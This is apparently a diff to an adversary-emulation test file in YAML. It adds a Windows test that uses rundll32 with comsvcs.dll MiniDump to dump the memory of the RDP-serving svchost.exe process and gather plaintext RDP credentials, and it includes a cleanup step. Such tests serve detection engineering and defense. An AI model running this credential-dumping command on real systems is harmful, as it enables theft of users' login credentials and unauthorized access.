@@ -85,3 +85,22 @@ atomic_tests:
       Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore
     name: powershell
     elevation_required: true
+    
+- name: Dump svchost.exe to gather RDP credentials
+  description: |
+    The svchost.exe contains the RDP plain-text credentials.
+    Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+    
+    Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+      if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+    cleanup_command: |
+      Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
